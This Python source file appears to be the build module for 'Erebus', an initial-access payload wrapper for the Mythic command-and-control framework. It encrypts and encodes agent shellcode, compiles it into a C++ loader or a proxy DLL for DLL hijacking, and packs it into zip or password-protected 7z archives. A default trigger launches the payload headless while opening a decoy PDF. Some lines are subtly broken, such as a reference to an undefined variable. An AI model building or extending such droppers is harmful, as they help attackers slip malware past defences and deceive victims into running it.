'''
- Author: Lavender-exe // Whispergate
- Title: Erebus
- Description: Initial Access Wrapper

TODO:
- Containers
    - MSI/X Payload Containers
        -   https://github.com/TrevorHamm/msilib (Only supports python13)
    - 7zip/Winzip Containers
        -   https://pypi.org/project/py7zr
- Triggers
    - LNK
        -   https://github.com/strayge/pylnk
'''
from erebus_wrapper.erebus.modules.payload_dll_proxy import generate_proxies
from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
from erebus_wrapper.erebus.modules.container_msi import build_msi
from erebus_wrapper.erebus.modules.container_7z import build_7z

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

from pathlib import PurePath
from distutils.dir_util import copy_tree
from jinja2 import Environment, FileSystemLoader
import os
import asyncio
import subprocess
import tempfile
import shutil
import json


ENCRYPTION_METHODS = {
    "AES128_CBC" :  "aes_128",
    "AES256_CBC" :  "aes_cbc",
    "AES256_ECB" :  "aes_ecb",
    "CHACHA20"   :  "chacha20",
    "RC4"        :  "rc4",
    "SALSA20"    :  "salsa20",
    "XOR"        :  "xor",
    "XOR_COMPLEX":  "xor_complex",
}

COMPRESSION_METHODS = {
    "LZNT1": "lznt",
    "RLE"  : "rle",
    "NONE" : ""
}

ENCODING_METHODS = {
    "ALPHA32" : "alpha",
    "ASCII85" : "ascii85",
    "BASE64"  : "base64",
    "WORDS256": "words",
    "NONE"    : ""
}

SHELLCODE_FORMAT = {
    "C"          : "c",
    "CSharp"     : "csharp",
    "Nim"        : "nim",
    "Go"         : "go",
    "Python"     : "py",
    "Powershell" : "ps1",
    "VBA"        : "vba",
    "VBScript"   : "vbs",
    "Rust"       : "rust",
    "JavaScript" : "js",
    "Zig"        : "zig",
    "Raw"        : "raw",
}

FINAL_PAYLOAD_EXTENSIONS = [
    "exe",
    "dll",
    "7z",
    "zip",
    "tar",
    "tar.gz",
    "bin",
]


class ErebusWrapper(PayloadType):
    name = "erebus_wrapper"
    author = "@Lavender-exe, @hunterino-sec"
    semver = "v0.0.1"
    note = f"An Initial Access Toolkit."

    file_extension = "zip"
    supported_os = [
        SupportedOS.Windows
        # SupportedOS.Linux, # Not Supported Yet
        # SupportedOS.MacOS, # Not Supported Yet
    ]

    wrapper = True
    wrapped_payloads = []
    c2_profiles = []

    agent_type = AgentType.Wrapper
    agent_path = PurePath(".") / "erebus_wrapper"
    agent_icon_path = agent_path / "Erebus.svg"
    agent_code_path = agent_path / "agent_code"

    build_parameters = [
        BuildParameter(
            name = "Main Payload Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the main payload type (Shellcode Loader or DLL Hijack)
NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Loader` and C for `Hijack`.
""",
            choices = ["Loader", "Hijack"],
            default_value="Loader",
        ),

        BuildParameter(
            name = "Loader Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's filetype.",
            choices = ["EXE", "DLL"],
            default_value = "EXE",
            hide_conditions = [
                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                # Change this if you are using a custom Loader written in another language
                HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
            ]
        ),

        BuildParameter(
            name = "Loader Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config.",
            choices = ["debug", "release"],
            default_value = "debug",
            hide_conditions = [
                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                # Change this if you are using a custom shellcode retrieval method
                HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="Raw"),
            ]
        ),

        BuildParameter(
            name = "DLL Hijacking",
            parameter_type = BuildParameterType.File,
            description = f"""Prepares a given DLL for proxy-based hijacking.
NOTE: Shellcode Format must be set to C.
NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
""",
            hide_conditions = [
                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                # Change this if you are using a custom DLL Loader written in another language
                HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
            ]
        ),

        BuildParameter(
            name = "Trigger Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a command to run when the trigger is executed.",
            choices = ["ClickOnce", "LNK", "MSI", "7z"],
            default_value = "ClickOnce",
            hide_conditions = [
                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
            ]
        ),

        BuildParameter(
            name = "Trigger Command",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "C:\\Windows\\System32\\conhost.exe --headless cmd.exe /Q /c payload.exe | decoy.pdf",
        ),

        BuildParameter(
            name = "Decoy File",
            parameter_type = BuildParameterType.File,
            description = """Upload a decoy file (PDF/XLSX/etc.).
If one is not uploaded then an example file will be used.""",
        ),

        # Shellcrypt
        BuildParameter(
            name = "Compression Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a compression type for the shellcode.",
            choices = [
                "LZNT1",
                "RLE",
                "NONE",
            ],
            default_value="NONE"
        ),

        BuildParameter(
            name = "Encryption Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encryption type for the shellcode.",
            choices = [
                "AES128_CBC",
                "AES256_CBC",
                "AES256_ECB",
                "CHACHA20",
                "SALSA20",
                "XOR",
                "XOR_COMPLEX",
            ],
            default_value = "XOR"
        ),

        BuildParameter(
            name = "Encryption Key",
            parameter_type = BuildParameterType.String,
            description = """Choose an encryption key. A random one will be
generated if none have been entered.""",
            default_value="NONE"
        ),

        BuildParameter(
            name = "Encoding Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encoding type for the shellcode.",
            choices = [
                "ALPHA32",
                "ASCII85",
                "BASE64",
                "WORDS256",
                "NONE",
            ],
            default_value="NONE"
        ),

        BuildParameter(
            name = "Shellcode Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a format for the obfuscated shellcode.",
            choices = [
                "C",
                "CSharp",
                "Nim",
                "Go",
                "Python",
                "Powershell",
                "VBA",
                "VBScript",
                "Rust",
                "JavaScript",
                "Zig",
                "Raw",
            ],
            default_value = "C",
            required = True,
        ),

        BuildParameter(
            name = "Shellcode Array Name",
            parameter_type = BuildParameterType.String,
            description = "Choose a name for the generated shellcode array. E.g. [array name] --> sh3llc0d3[113]...",
            default_value = "shellcode",
            hide_conditions = [
                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
            ]
        ),
        
        #7z
    BuildParameter(
        name="7z Compression Level",
        parameter_type=BuildParameterType.ChooseOne,
        description="Select compression level (9 is max).",
        choices=["0", "1", "3", "5", "7", "9"],
        default_value="9",
        hide_conditions=[
            HideCondition(name="Trigger Type", operand=HideConditionOperand.NotEQ, value="7z")
        ]
    ),
    
    BuildParameter(
        name="Archive Password",
        parameter_type=BuildParameterType.String,
        description="Optional password for the archive (leave empty for none).",
        default_value="",
        required=False,
        hide_conditions=[
            HideCondition(name="Trigger Type", operand=HideConditionOperand.NotEQ, value="7z")
        ]
    ),        

        # ProtectMyTooling
        # BuildParameter(

        # ),

        # LNK
        # BuildParameter(

        # ),

        # PackMyPayload
        # BuildParameter(

        # ),
    ]

    build_steps = [
        BuildStep(step_name = "Gathering Files",
                  step_description = "Copy files to temporary location"),

        BuildStep(step_name = "Header Check",
                  step_description = "Check file for MZ Header"),

        BuildStep(step_name = "Shellcode Obfuscation",
                  step_description = "Obfuscating shellcode based on selected options"),

        BuildStep(step_name = "Gathering DLL Exports for Hijacking",
                  step_description = "Extracts exports from the uploaded DLL to be used for proxying"),

        BuildStep(step_name = "Compiling DLL Payload",
                  step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),

        BuildStep(step_name = "Compiling Shellcode Loader",
            step_description = "Compiling Shellcode Loader with Obfuscated Raw Agent Shellcode"),

        BuildStep(step_name = "Adding Trigger",
                  step_description = "Creating trigger to execute given payload"),

        BuildStep(step_name = "Creating Decoy",
                  step_description= "Creating a placeholder decoy file"),

        BuildStep(step_name = "Containerising",
                  step_description = "Adding payload into chosen container"),

        BuildStep(step_name = "Packaging",
                  step_description = "Packaging final payload into zip archive")
    ]

    def containerise_payload(self):
        """Creates a container and adds all files generated from the payload function inside of the given archive/media
        TODO:
            - 7z Compression
            - ZIP Compression
            - ISO Container
        """
        trigger = self.get_parameter("Trigger Type")
        if trigger == "7z":
            
            files = {
                "erebus.exe": str(self.generated_payload_path)
            }
            
            spec = {
                "files": files,
                "archive_name": "payload.7z",
                "payload_name": "erebus.exe"
            }
            
            spec_path = PurePath(self.agent_build_path) / f"spec_{self.uuid}.json"
            
            with open(spec_path, "w") as f:
                json.dump(spec, f)
                
            try:
                return build_7z(
                    spec_name=str(spec_path),
                    out_dir_name=self.uuid,
                    compression=self.get_parameter("7z Compression Level"),
                    password=self.get_parameter("Archive Password")
                )
            finally:
                if os.path.exists(spec_path):
                    os.remove(spec_path)
                    
        return None

    def create_triggers(self):
        """Creates a trigger to execute the payload

        Raises:
            NotImplementedError: Function not implemented yet.

        TODO:
            - LNK Trigger
            - LOLBIN Trigger
            - MSI/MST Trigger
            - ClickOnce Trigger
        """
        raise NotImplementedError

    async def build(self) -> BuildResponse:
        response = BuildResponse(status = BuildStatus.Error)
        output = ""

        try:
            agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
            copy_tree(str(self.agent_code_path), agent_build_path)

            mythic_shellcode_path = PurePath(agent_build_path) / "shellcode" / "payload.bin"
            mythic_shellcode_path = str(mythic_shellcode_path)

            obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
            obfuscated_shellcode_path = str(obfuscated_shellcode_path)

            shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
            clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
            encryption_key_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "key.hpp"

            shellcode_loader_path = str(shellcode_loader_path)
            clickonce_loader_path = str(clickonce_loader_path)
            encryption_key_path = str(encryption_key_path)

            shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
            shellcrypt_path = str(shellcrypt_path)

            templates_path = PurePath(agent_build_path) / "templates"
            dll_hijack_template_path = templates_path / "dll_template.cpp"
            dll_target_path = templates_path / "dll_target.dll"
            dll_exports_path = templates_path / "proxy.def"

            templates_path = str(templates_path)
            dll_hijack_template_path = str(dll_hijack_template_path)
            dll_target_path = str(dll_target_path)
            dll_exports_path = str(dll_exports_path)

            environment = Environment(loader=FileSystemLoader(templates_path))

            with open(mythic_shellcode_path, "wb") as file:
                file.write(self.wrapped_payload)

            if os.stat(mythic_shellcode_path) == 0:
                response.status = BuildStatus.Error
                response.build_stderr = "Failed to write Mythic Shellcode to placeholder file."
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Gathering Files",
                        StepStdout="Failed to write Mythic Shellcode to placeholder file.",
                        StepSuccess=False
                    ))
                return response

            response.status = BuildStatus.Success
            response.build_message = "Files Gathered for Modification."
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName = "Gathering Files",
                StepStdout = "Gathered files to obfuscate shellcode",
                StepSuccess = True
            ))

            with open(str(mythic_shellcode_path), "rb") as f:
                header = f.read(2)
                if header == b"\x4d\x5a":
                    response.status = BuildStatus.Error
                    response.build_stderr = "Supplied payload is a PE instead of raw shellcode."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Header Check",
                        StepStdout="Found leading MZ header - supplied file was not shellcode",
                        StepSuccess=False
                    ))
                    return response
            response.status = BuildStatus.Success
            response.build_message = "No leading MZ header found in payload."
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Header Check",
                StepStdout="No leading MZ header found in payload",
                StepSuccess=True
            ))

            cmd = [
                "python",
                shellcrypt_path,
                "-i", mythic_shellcode_path,
                "-e", ENCRYPTION_METHODS[self.get_parameter("Encryption Type")],
                "-f", SHELLCODE_FORMAT[self.get_parameter("Shellcode Format")],
            ]

            if self.get_parameter("Shellcode Format") != "Raw":
                cmd += ["-a", self.get_parameter("Shellcode Array Name")]

            if self.get_parameter("Compression Type") != "NONE":
                cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("Compression Type")]]

            if self.get_parameter("Encoding Type") != "NONE":
                cmd += ["-d", ENCODING_METHODS[self.get_parameter("Encoding Type")]]

            if self.get_parameter("Encryption Key") != "NONE":
                cmd += ["-k", self.get_parameter("Encryption Key")]

            cmd += ["-o", obfuscated_shellcode_path]

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await process.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            if os.path.exists(obfuscated_shellcode_path):
                if self.get_parameter("Shellcode Format") == "Raw":
                    # Get the encryption key in C format to be used within the loader and other functions
                    cmd = [
                        "python",
                        shellcrypt_path,
                        "-i", mythic_shellcode_path,
                        "-e", ENCRYPTION_METHODS[self.get_parameter("Encryption Type")],
                        "-f",
                        "c",
                        "-a",
                        "shellcode"
                    ]

                    if self.get_parameter("Encryption Key") != "NONE":
                        cmd += ["-k", self.get_parameter("Encryption Key")]

                    key_src = subprocess.check_output(cmd, text=True)
                    output += key_src

                    start = key_src.find("unsigned char key")
                    end   = key_src.find("};", start) + 2
                    key_array = key_src[start:end]
                    output += key_array

                    with open(encryption_key_path, "w+") as file:
                        file.write(key_array)

                    # response.payload = open(obfuscated_shellcode_path, "rb").read()
                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    response.build_stdout = output + "\n" + obfuscated_shellcode_path
                    response.updated_filename = "erebus_wrapper.bin"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Shellcode Obfuscation",
                        StepStdout="Obfuscating Shellcode - Continuing to Shellcode Loader",
                        StepSuccess=True,
                    ))
                    # Remove this line to continue to the next exec cycle (Triggers, Containers, etc.)
                    # return response
                else:
                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Shellcode Obfuscation",
                        StepStdout="Obfuscating Shellcode - Continuing to DLL Loader",
                        StepSuccess=True,
                    ))
            elif proc.returncode != 0:
                response.payload = b""
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response
            else:
                response.payload = b""
                response.status = BuildStatus.Error
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response
            output = ""


            ######################### DLL Hijacking Section #########################
            if self.get_parameter("Main Payload Type") == "Hijack":
                print(f'User Selected: {self.get_parameter("Main Payload Type")}')

                file_content = await getFileFromMythic(
                    agentFileId=self.get_parameter("DLL Hijacking")
                )

                file_name_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    AgentFileID=self.get_parameter("DLL Hijacking")
                ))

                dll_file_name = ""
                if file_name_resp.Success:
                    if len(file_name_resp.Files) > 0:
                        dll_file_name = file_name_resp.Files[0].Filename

                payload_path = PurePath(agent_build_path) / "payload" / dll_file_name
                payload_path = str(payload_path)

                with open(dll_target_path, "wb") as file:
                    file.write(file_content)

                exports = await generate_proxies(dll_file=dll_target_path,dll_file_name=dll_file_name)

                with open(obfuscated_shellcode_path, "r") as file:
                    shellcode_content = file.read()

                shellcode = {
                    "SHELLCODE": shellcode_content
                }

                exports_list = {
                    "EXPORTS": exports
                }

                dll_template = environment.get_template("dll_template.cpp")
                proxy_template = environment.get_template("proxy.def")
                dll_output = dll_template.render(**shellcode)
                proxy_output = proxy_template.render(**exports_list)

                with open(dll_hijack_template_path, "w") as file:
                    file.write(dll_output)

                with open(dll_exports_path, "w") as file:
                    file.write(proxy_output)

                # Check if the file size stayed the same as the template
                if os.stat(dll_hijack_template_path).st_size == 1598 or os.stat(dll_exports_path).st_size == 13:
                    response.status = BuildStatus.Error
                    response.build_message = "Failed to proxy the given file."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Gathering DLL Exports for Hijacking",
                        StepStdout="Failed to proxy the given file.",
                        StepSuccess=False,
                    ))
                    return response
                else:
                    response.status = BuildStatus.Success
                    response.build_message = "DLL Proxied! Compiling Payload..."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Gathering DLL Exports for Hijacking",
                        StepStdout="DLL Proxied! Compiling Payload...",
                        StepSuccess=True,
                    ))

                cmd = [
                    "x86_64-w64-mingw32-gcc",
                    "-shared",
                    "-o",
                    payload_path,
                    dll_hijack_template_path,
                    dll_exports_path,
                    "-I/usr/x86_64-w64-mingw32/include",
                    "-L/usr/x86_64-w64-mingw32/lib"
                    "-e DllMain",
                    "-DDLL",
                ]

                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                stdout, stderr = await process.communicate()

                if stdout:
                    output += f"[stdout]\n{stdout.decode()}"
                if stderr:
                    output += f"[stderr]\n{stderr.decode()}"

                if os.path.exists(payload_path):
                    # response.payload = open(payload_path, "rb").read()
                    response.status = BuildStatus.Success
                    response.build_message = "DLL Compiled!"
                    response.build_stdout = output + "\n" + payload_path
                    # response.updated_filename = dll_file_name
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compiling DLL Payload",
                        StepStdout="DLL Loader Compiled!",
                        StepSuccess=True,
                    ))
                    # Debug
                    # return response
                else:
                    response.status = BuildStatus.Error
                    response.payload = b""
                    response.build_message = "Failed to compile DLL"
                    response.build_stderr = output + "\n" + payload_path
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compiling DLL Payload",
                        StepStdout="Failed to Compile DLL Payload",
                        StepSuccess=False,
                    ))
                    return response
                output = ""
            ######################### End Of DLL Hijacking Section #########################
            ######################### Shellcode Loader Section #########################
            if self.get_parameter("Main Payload Type") == "Loader":
                print(f'User Selected: {self.get_parameter("Main Payload Type")}')

                shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin", src=obfuscated_shellcode_path)

                payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
                payload_path = str(payload_path)

                # Convert resource file to UTF16
                cmd = [
                    "iconv",
                    "-f",
                    "UTF-16LE",
                    "-t",
                    "UTF-8",
                    f"{shellcode_loader_path}/Erebus.Loader.rc",
                ]

                resource_file = subprocess.check_output(cmd, text=True)
                with open(f"{shellcode_loader_path}/Erebus.Loader.utf8.rc", "w") as file:
                    file.write(resource_file)

                cmd = [
                    "mv",
                    f"{shellcode_loader_path}/Erebus.Loader.utf8.rc",
                    f"{shellcode_loader_path}/Erebus.Loader.rc",
                ]
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await process.communicate()

                if stdout:
                    output += f"[stdout]\n{stdout.decode(errors='replace')}"
                if stderr:
                    output += f"[stderr]\n{stderr.decode(errors='replace')}"

                # Compile Loader
                cmd = [
                    "make",
                    "-C",
                    shellcode_loader_path,
                    f"BUILD={self.get_parameter('Loader Build Configuration')}",
                    "all"
                ]
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, stderr = await process.communicate()

                if stdout:
                    output += f"[stdout]\n{stdout.decode(errors='replace')}"
                if stderr:
                    output += f"[stderr]\n{stderr.decode(errors='replace')}"

                shutil.copy(dst=payload_path, src=f"{shellcode_loader_path}/erebus.exe")

                if os.path.exists(payload_path):
                    # Debug
                    # response.payload = open(payload_path, "rb").read()
                    # response.updated_filename = "erebus_loader.exe"
                    response.status = BuildStatus.Success
                    response.build_message = "Loader Compiled!"
                    response.build_stdout = output + "\n" + payload_path
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compiling Shellcode Loader",
                        StepStdout="Shellcode Loader Compiled!",
                        StepSuccess=True,
                    ))

                    # return response
                else:
                    response.status = BuildStatus.Error
                    response.build_message = "Failed to compile loader"
                    response.build_stderr = output + "\n" + payload_path
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compiling Shellcode Loader",
                        StepStdout="Failed to Compile Shellcode Loader",
                        StepSuccess=False,
                    ))
                    return response
                output = ""
            ######################### End Of Shellcode Loader Section #########################

            #Final Payload / Container
            
            # 1. Capture context for container function
            if 'payload_path' in locals():
                final_path = payload_path
            else:
                final_path = obfuscated_shellcode_path

            self.generated_payload_path = final_path
            self.agent_build_path = agent_build_path

            # 2. Attempt Containerization
            container_path = self.containerise_payload()

            if container_path:
                # Case A: Container created (7z/MSI)
                with open(container_path, "rb") as f:
                    response.payload = f.read()
                
                trigger = self.get_parameter("Trigger Type")
                ext = "7z" if trigger == "7z" else "bin"
                if trigger == "MSI": ext = "msi"
                
                response.updated_filename = f"payload.{ext}"
                response.status = BuildStatus.Success
                response.build_message = f"Success! Containerized ({trigger})"
                
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Containerising",
                    StepStdout=f"Payload packaged into {trigger} container",
                    StepSuccess=True,
                ))
            else:
                # Case B: Default ZIP behavior (No specific container selected)
                shutil.make_archive(f"{agent_build_path}/payload", "zip", f"{agent_build_path}/payload")
                response.payload = open(f"{agent_build_path}/payload.zip", "rb").read()
                
                response.updated_filename = "payload.zip"
                response.status = BuildStatus.Success
                response.build_message = "Success! Packaged (Zip)"
                
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Packaging",
                    StepStdout="Final Payload Packaged to Zip Archive",
                    StepSuccess=True,
                ))

            return response
        
        except Exception as e:
            response.status = BuildStatus.Error
            response.build_message = f"Error building wrapper: {str(e)}\n{output}"
            return response